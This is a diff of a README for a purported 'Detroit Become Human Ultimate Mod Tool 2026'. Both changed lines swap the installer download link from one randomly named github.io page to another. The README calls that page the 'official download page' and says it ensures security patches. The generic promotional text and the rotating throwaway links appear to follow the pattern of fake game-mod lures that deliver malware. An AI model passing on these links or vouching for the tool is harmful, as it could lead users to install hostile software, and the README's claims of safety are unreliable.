@@ -2,7 +2,7 @@
 
 The Detroit Become Human Ultimate Mod Tool 2026 is your go-to Windows desktop application for enhancing and customizing your gameplay experience. Designed for the year 2026, this tool offers a range of features to help you explore all aspects of Detroit Become Human without limitations. Whether you're a first-time player or revisiting the story, this mod tool provides the flexibility to tweak settings, edit saves, and unlock paths for a personalized adventure.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -78,7 +78,7 @@ A: This tool is intended for educational and personal use only. Always respect t
 
 For the latest version of the Detroit Become Human Ultimate Mod Tool, please visit the official download page. This ensures you get the most up-to-date features and security patches.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to the installer and additional resources. Remember to always download from trusted sources to protect your system.
 
